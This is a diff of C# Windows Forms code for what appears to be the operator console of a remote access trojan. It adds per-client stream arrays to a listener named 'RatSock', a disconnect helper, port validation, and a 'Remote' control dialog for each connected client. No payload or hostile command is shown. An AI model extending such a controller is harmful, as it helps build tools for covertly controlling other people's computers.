@@ -21,16 +21,22 @@ namespace WindowsFormsApplication1
     public partial class Main : RibbonForm
     {
 
-
+        NetworkStream NS;
+        StreamWriter SW;
+        StreamReader SR;
         TcpListener TCPListen;
         Thread PortListen;
         Socket RatSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         List<int> ItemIndexList = new List<int>();
         public NetworkStream[] NSArray = new NetworkStream[9999];
+        public StreamWriter[] SWArray = new StreamWriter[9999];
+        public StreamReader[] SRArray = new StreamReader[9999];
+        byte[] ConnectionBuffer = new byte[0];
+        bool running = false;
         int IDNum = 1;
         int Connected = 0;
-        bool running = false;
         int ItemIndex = 0;
+      
         public Main()
         {
             InitializeComponent();
@@ -74,18 +80,19 @@ namespace WindowsFormsApplication1
 
         void Client(ListViewItem Item, int ID)
         {
-            NetworkStream NS = new NetworkStream(RatSock);
-            MessageBox.Show(ID.ToString());
-            NSArray[ID] = NS;
+            NS = new NetworkStream(RatSock);
             IDNum++;
-            StreamWriter SW = new StreamWriter(NS);
-            StreamReader SR = new StreamReader(NS);
+            SW = new StreamWriter(NS);
+            SR = new StreamReader(NS);
+            SWArray[ID] = SW;
+            SRArray[ID] = SR;
             StringBuilder Input = new StringBuilder();
             while (running)
             {
                 try
                 {
-                    SR.ReadLine();
+
+                    NS.Read(ConnectionBuffer, 0, 0);
                 }
 
                 catch
@@ -132,11 +139,7 @@ namespace WindowsFormsApplication1
                 TCPListen.Stop();
                 RatSock.Close();
                 listViewEx1.Items.Clear();
-                for (int i = 0; i < NSArray.Length; i++)
-                {
-                    NSArray[i] = null;
-                }
-
+                Classes.Connection.Disconnect(NSArray, SWArray, SRArray);
                 textBoxX1.Enabled = true;
             }
 
@@ -144,10 +147,21 @@ namespace WindowsFormsApplication1
             {
                 //Enabled State
                 //PREPARIN TO FIRE MAH LAZER
-                textBoxX1.Enabled = false;
-                running = true;
-                PortListen = new Thread(() => Listen(Convert.ToInt32(textBoxX1.Text)));
-                PortListen.Start();
+                try
+                {
+
+                    Convert.ToInt32(textBoxX1.Text);
+                    textBoxX1.Enabled = false;
+                    running = true;
+                    PortListen = new Thread(() => Listen(Convert.ToInt32(textBoxX1.Text)));
+                    PortListen.Start();
+                }
+
+                catch 
+                { 
+                    MessageBox.Show("Please enter a valid port","Error", 0, MessageBoxIcon.Warning);
+                    switchButton1.Value = false;
+                }
             }
         }
 
@@ -166,8 +180,9 @@ namespace WindowsFormsApplication1
 
         private void buttonItem32_Click(object sender, EventArgs e)
         {
-            Remote Remote = new Remote(NSArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
+            Remote Remote = new Remote(SRArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)], SWArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
             Remote.ShowDialog();
+           
         }
 
        private void Derped(object Obj, ThreadExceptionEventArgs Arg)
